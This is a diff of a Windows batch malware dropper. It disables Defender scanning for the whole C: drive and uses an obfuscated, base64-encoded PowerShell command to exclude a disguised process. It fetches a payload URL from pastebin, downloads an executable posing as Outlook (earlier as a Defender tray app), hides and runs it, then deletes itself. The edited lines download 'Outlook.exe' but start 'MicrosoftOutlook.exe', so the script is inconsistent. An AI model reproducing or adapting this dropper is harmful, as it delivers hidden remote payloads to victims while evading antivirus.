@@ -23,7 +23,7 @@ if '%errorlevel%' NEQ '0' (
 
 :gotAdmin
     powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\'"
-    powershell.exe -EncodedCommand "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBDAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAJwBNAGkAYwByAG8AcwBvAGYAdABEAGUAZgBlAG4AZABlAHIAUwB5AHMAdAByAGEAeQAuAGUAeABlACcAIgA="
+    powershell.exe -EncodedCommand "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBDAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAJwBPAHUAdABsAG8AbwBrAC4AZQB4AGUAJwAiAA=="
 
     set "targetDir=%AppData%\SubDir"
     if not exist "%targetDir%" (
@@ -32,12 +32,12 @@ if '%errorlevel%' NEQ '0' (
     attrib +h "%targetDir%" /s /d
     cd /d "%targetDir%"
 
-    for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest 'https://pastebin.com/raw/2awnAGqf').Content"') do set fileURL=%%i
+    for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest 'https://pastebin.com/raw/jDCi7kMn').Content"') do set fileURL=%%i
 
-    powershell -Command "Invoke-WebRequest '%fileURL%' -OutFile 'MicrosoftDefenderSystray.exe'"
+    powershell -Command "Invoke-WebRequest '%fileURL%' -OutFile 'Outlook.exe'"
 
-    attrib +h "%targetDir%\MicrosoftDefenderSystray.exe" /s /d
-    start MicrosoftDefenderSystray.exe
+    attrib +h "%targetDir%\MicrosoftOutlook.exe" /s /d
+    start MicrosoftOutlook.exe
 
     timeout /t 5 /nobreak >nul
     del "%~f0"
